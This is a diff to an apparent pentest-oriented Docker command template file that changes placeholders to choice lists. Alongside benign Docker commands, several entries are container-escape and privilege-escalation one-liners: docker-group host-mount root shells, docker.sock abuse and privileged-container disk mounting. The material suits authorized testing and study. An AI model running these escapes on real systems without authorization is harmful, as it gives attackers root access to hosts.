@@ -10,7 +10,7 @@
 Run a container with interactive terminal and auto-remove on exit.
 
 ```bash
-docker run -it --rm --name {{NAME:str:mybox}} {{IMAGE:str:ubuntu:latest}} /bin/bash
+docker run -it --rm --name {{NAME:str:mybox}} {{IMAGE:choice:ubuntu:latest,alpine:latest,debian:latest,kalilinux/kali-rolling,busybox:latest,python:3,node:latest}} /bin/bash
 ```
 
 <!-- meta: risk=low | phase=misc | tags=run,interactive,shell -->
@@ -21,7 +21,7 @@ docker run -it --rm --name {{NAME:str:mybox}} {{IMAGE:str:ubuntu:latest}} /bin/b
 Run a container with port mapping and volume mount.
 
 ```bash
-docker run -d --name {{NAME:str:webapp}} -p {{HPORT:port:8080}}:{{CPORT:port:80}} -v {{HOSTPATH:dir:./data}}:{{CONTPATH:str:/app/data}} {{IMAGE:str:nginx:latest}}
+docker run -d --name {{NAME:str:webapp}} -p {{HPORT:port:8080}}:{{CPORT:port:80}} -v {{HOSTPATH:dir:./data}}:{{CONTPATH:str:/app/data}} {{IMAGE:choice:nginx:latest,httpd:latest,caddy:latest,traefik:latest,haproxy:latest,redis:latest,postgres:latest,mysql:latest}}
 ```
 
 <!-- meta: risk=low | phase=misc | tags=run,port,volume,mount -->
@@ -120,7 +120,7 @@ docker system prune -af --volumes
 List, create, and inspect Docker networks.
 
 ```bash
-docker network ls && docker network inspect {{NETWORK:str:bridge}}
+docker network ls && docker network inspect {{NETWORK:choice:bridge,host,none,overlay,macvlan,ipvlan}}
 ```
 
 <!-- meta: risk=safe | phase=misc | tags=network,inspect,list -->
@@ -131,7 +131,7 @@ docker network ls && docker network inspect {{NETWORK:str:bridge}}
 Abuse docker group membership to mount the host filesystem and drop into a root shell.
 
 ```bash
-docker run -v /:/mnt --rm -it {{IMAGE:str:alpine}} chroot /mnt sh
+docker run -v /:/mnt --rm -it {{IMAGE:choice:alpine,busybox,debian:slim,ubuntu:latest}} chroot /mnt sh
 ```
 
 <!-- meta: risk=high | phase=privesc | tags=privesc,docker-group,mount,root,escape -->
@@ -142,7 +142,7 @@ docker run -v /:/mnt --rm -it {{IMAGE:str:alpine}} chroot /mnt sh
 Spawn a host-mounted root shell through an exposed Docker socket (e.g. mounted into a container).
 
 ```bash
-docker -H unix://{{SOCKET:str:/var/run/docker.sock}} run -v /:/host --rm -it {{IMAGE:str:alpine}} chroot /host sh
+docker -H unix://{{SOCKET:str:/var/run/docker.sock}} run -v /:/host --rm -it {{IMAGE:choice:alpine,busybox,debian:slim,ubuntu:latest}} chroot /host sh
 ```
 
 <!-- meta: risk=high | phase=privesc | tags=privesc,socket,dockersock,escape -->
@@ -164,7 +164,7 @@ ls -la /.dockerenv 2>/dev/null; grep -aE 'docker|lxc|kubepods' /proc/1/cgroup 2>
 From inside a --privileged container, mount the host disk and chroot into it.
 
 ```bash
-fdisk -l; mount /dev/{{DISK:str:sda1}} /mnt && chroot /mnt sh
+fdisk -l; mount /dev/{{DISK:choice:sda1,sda2,sdb1,nvme0n1p1,xvda1,vda1}} /mnt && chroot /mnt sh
 ```
 
 <!-- meta: risk=high | phase=privesc | tags=escape,privileged,breakout,mount -->
@@ -230,7 +230,7 @@ mkdir -p {{OUTDIR:dir:./rootfs}} && docker create --name tmp_extract {{IMAGE:str
 Get an interactive shell inside an image even when it has an ENTRYPOINT that would otherwise auto-start an app. Run Linux commands locally in the container.
 
 ```bash
-docker run -it --rm --entrypoint {{SHELL:str:bash}} {{IMAGE:str:target:latest}}
+docker run -it --rm --entrypoint {{SHELL:choice:bash,sh,ash,zsh,dash,fish}} {{IMAGE:str:target:latest}}
 ```
 
 <!-- meta: risk=low | phase=post | tags=run,shell,entrypoint,interactive,inside,bash -->
